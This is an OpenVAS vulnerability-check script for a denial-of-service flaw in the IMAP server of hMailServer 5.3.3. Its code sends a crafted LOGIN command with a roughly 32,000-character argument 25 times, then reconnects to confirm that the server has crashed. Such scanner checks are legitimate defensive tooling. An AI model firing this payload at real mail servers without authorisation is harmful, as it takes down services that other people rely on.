##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_hmailserver_imap_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# hMailServer IMAP Remote Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
##############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow the attacker to cause denial of service.
  Impact Level: Application";
tag_affected = "hMailServer Version 5.3.3  Build 1879";
tag_insight = "This flaw is due to an error within the IMAP server when handling a long
  argument to the 'LOGIN' command.";
tag_solution = "No solution or patch is available as of 29th October, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.hmailserver.com/";
tag_summary = "This host is running hMailServer and is prone to denial of service
  vulnerability.";


if(description)
{
  script_id(902929);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-10-29 13:43:35 +0530 (Mon, 29 Oct 2012)");
  script_name("hMailServer IMAP Remote Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://1337day.com/exploit/19642");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/22302/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/117723/hmailserver-dos.txt");
  script_xref(name : "URL" , value : "http://bot24.blogspot.in/2012/10/hmailserver-533-imap-remote-crash-poc.html");

  script_description(desc);
  script_summary("Send a long argument to the 'LOGIN' command and confirm the DOS in hMailServer");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Denial of Service");
  script_require_ports("Services/imap", 143);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("imap_func.inc");

port = "";
soc = "";
soc2 = "";
res = "";

## Get the default port
port = get_kb_item("Services/imap");
if(!port) {
  port = 143;
}

## Check the port status
if(!get_port_state(port)) {
  exit(0);
}

## Confirm the application through banner
if("* OK IMAPrev1" >!< get_imap_banner(port:port)){
  exit(0);
}

## Open the socket
soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

## Construct the crafted request
data = string("a LOGIN ", crap(length:32755, data:"A"),
              " AAAAAAAA\r\n", "a LOGOUT\r\n");

## Send the crafted request multiple times
for(i=0;i<25;i++){
  send(socket:soc, data:data);
}

recv(socket:soc, length:4096);

##close the socket
close(soc);

## Delay
sleep(5);

## Open the socket again  after sending crafted data
soc2 = open_sock_tcp(port);
if(soc2)
{
  res =   recv(socket:soc2, length:4096);
  ## Confirm if server is not responding anything its died
  if ("* OK IMAPrev1" >!< res)
  {
    security_warning(port:port);
    close(soc2);
    exit(0);
  }
}
else
{
  ## if socket creation fails server is died
  security_warning(port);
}
